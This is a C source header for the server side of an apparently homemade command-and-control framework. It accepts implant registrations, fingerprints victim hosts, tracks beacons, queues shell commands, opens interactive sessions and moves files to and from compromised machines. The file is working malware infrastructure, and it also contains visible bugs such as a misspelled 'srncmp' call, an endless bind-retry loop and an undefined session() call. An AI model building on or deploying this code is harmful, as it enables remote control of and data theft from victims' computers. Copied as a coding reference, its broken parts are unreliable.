#ifndef agent
#define agent

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <pthread.h>
#include <cjson/cJSON.h>
#include <openssl/sha.h>
#include "db.h"
#include "logs.h"

#define BUFFER_SIZE 4096
#define MAX_RESPONSE 0x20000


struct thread_args {
    int sock;
    char ip[256];
};


// prototypes
void register_agent(cJSON *json, char*ip, int sock);
void get_agent_id(const char *input, char output[65]);
void beacon(cJSON *json, int sock);
void upload(char *file);
void download(char *file);
///// 



void *agent_handler(void *args) {
    struct thread_args *arg = (struct thread_args*)args;
    int sock = arg->sock;
    
    
    // recieves message from implant register or beaconing
    char buffer[BUFFER_SIZE];
    int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
    if (bytes_received <= 0) {
        perror("recv failed");
        return NULL;
    }
    buffer[bytes_received] = '\0'; 
    
    cJSON *json = cJSON_Parse(buffer);
    if (!json) {
        printf("Error parsing JSON!\n");
        return NULL;
    }

    cJSON *type = cJSON_GetObjectItem(json, "mode");
    if (strcmp(type->valuestring, "register") == 0) {
        register_agent(json, arg->ip, sock);
    } else if (strcmp(type->valuestring, "beacon") == 0) {
        beacon(json, sock);
    } // add session mode

    //cJSON_Delete(json);
    close(sock);
    free(args);
    return NULL;
}

void *agent_conn(void *port) {
    int AGENT_PORT = *(int*)port;
    struct sockaddr_in clientAddr;
    socklen_t client_len = sizeof(clientAddr);
    int serverSock;

    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == -1) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(AGENT_PORT);
    serverAddr.sin_family = AF_INET;

    BIND:
    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
        perror("binding failed");
        goto BIND;
        sleep(30);
        close(serverSock);
        return NULL;
    }

    if (listen(serverSock, SOMAXCONN) == -1) {
        perror("Listen Failed");
        close(serverSock);
        return NULL;
    }
    
    while (1) {
        int sock;
        if ((sock = accept(serverSock, (struct sockaddr*)&clientAddr, (socklen_t*)&client_len)) < 0) {
            perror("Accept failed");
            continue;
        }
        
        // port = ntohs(clientAddr.sin_port) 
        // ip = inet_ntoa(client_addr.sin_addr)

        pthread_t thread;
        struct thread_args *args = malloc(sizeof(struct thread_args));
        args->sock = sock;
        strcpy(args->ip, inet_ntoa(clientAddr.sin_addr));

        if (pthread_create(&thread, NULL, agent_handler, (void*)args) < 0) {
            perror("could not create thread");
            free(args);
            continue;
        }
        // Detach thread so resources are automatically freed on exit
        pthread_detach(thread);
        
    }

    close(serverSock);

    return NULL;

}


void get_agent_id(const char *input, char output[65]) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)input, strlen(input), hash);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(output + (i * 2), "%02x", hash[i]);
    }
    output[64] = 0;
}

void register_agent(cJSON *json, char *ip, int sock) {  

    cJSON *mac = cJSON_GetObjectItem(json, "mac");
    cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
    cJSON *os =  cJSON_GetObjectItem(json, "os");
    cJSON *arch = cJSON_GetObjectItem(json, "arch");

    char input[255];
    snprintf(input, sizeof(input), "%s-%s-%s-%s", mac->valuestring, hostname->valuestring, os->valuestring, arch->valuestring);
    char agent_id[65];
    get_agent_id(input, agent_id);

    // check if id already exists in database
    if (check_agent_id(agent_id) == 1) goto REPLY;

    //log
    log_new_agent(agent_id, os->valuestring, hostname->valuestring, mac->valuestring, arch->valuestring);

    // register to datbase (agent_id, os, ip, mac, hostname)
    // check if agent id exists
    struct db_agents args;
    strncpy(args.agent_id, agent_id, sizeof(args.agent_id) - 1);
    args.agent_id[sizeof(args.agent_id) - 1] = '\0';
    strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
    args.os[sizeof(args.os) - 1] = '\0';
    strncpy(args.ip, ip, sizeof(args.ip) - 1);
    args.ip[sizeof(args.ip) - 1] = '\0';
    strncpy(args.mac, mac->valuestring, sizeof(args.mac) - 1);
    args.mac[sizeof(args.mac) - 1] = '\0';
    strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
    args.hostname[sizeof(args.hostname) - 1] = '\0';

    strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
    args.arch[sizeof(args.arch) - 1] = '\0';
    AgentsTable(args);

    // reply with agent id
    REPLY:
    cJSON *json_reply = cJSON_CreateObject();
    cJSON_AddStringToObject(json_reply, "mode", "ack");
    cJSON_AddStringToObject(json_reply, "agent_id", agent_id);

    char *reply = cJSON_Print(json_reply);
    send(sock, reply, strlen(reply), 0);

    free(reply);
    cJSON_Delete(json_reply);
}


void beacon(cJSON *json, int sock) {
    cJSON *agent_id = cJSON_GetObjectItem(json, "agent_id");
    // log
    log_beacon(agent_id->valuestring);


    cJSON *json_reply = cJSON_CreateObject();

    // update last seen
    update_last_seen(agent_id->valuestring);
    // validate if agent id exists in the database.
    
    // check if there are tasks queue for agent
    // change this so that it stores all qeues in a data structure to optimize 
    int task_id = check_tasks_queue(agent_id->valuestring);
    if (task_id == -1) {
        cJSON_AddStringToObject(json_reply, "mode", "none");
        char *reply = cJSON_Print(json_reply);
        send(sock, reply, strlen(reply), 0);
        free(reply);
        cJSON_Delete(json_reply);
        return;
    } else {
        char *cmd =  get_task(task_id);
        if (cmd != NULL) {
            cJSON_AddStringToObject(json_reply, "command", cmd);
        } else {
            cJSON_AddStringToObject(json_reply, "command", "NULL");  // or "noop", or don't add it
        }
        cJSON_AddStringToObject(json_reply, "mode", "task");
        //cJSON_AddStringToObject(json_reply, "task_id", task_id);
        cJSON_AddNumberToObject(json_reply, "task_id", task_id);
        cJSON_AddStringToObject(json_reply, "agent_id", agent_id->valuestring);
        


        
        char *reply = cJSON_Print(json_reply);
        send(sock, reply, strlen(reply), 0);


        // if command == "session" | provide interactive shell
        if (strncmp(cmd, "session", 7) == 0) session();
        
        // if command = "upload [file path]" | upload file to agent 
        // if command = "download [file path]" | download file from agent
        if (strncmp(cmd, "download", 8) ==0 || strncmp(cmd, "upload", 6) == 0) {
            char file[BUFFER_SIZE];
            char command[BUFFER_SIZE];
            if (sscanf(cmd, "%s %s", command, file) == 2) {
                if (srncmp(command, "download", 8) == 0) {
                    download(file);
                } else {
                    upload(file);
                }
            }
        }
        free(cmd);
        // recv response and log to database
        // buffer response
        // respose with result
        char buffer[MAX_RESPONSE];
        int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
        if (bytes_received <= 0) {
            perror("recv failed (beacon func)");
            return;
        }
        buffer[bytes_received] = '\0'; 
    
        cJSON *response = cJSON_Parse(buffer);
        if (!response) {
            printf("Error parsing JSON!\n");
            return;
        }


        cJSON *command_response = cJSON_GetObjectItem(response, "response");
        store_task_response(command_response->valuestring, task_id);
        cJSON_Delete(response);

        // store response in database
        
        free(reply);
        cJSON_Delete(json_reply);
    }

    
}















#endif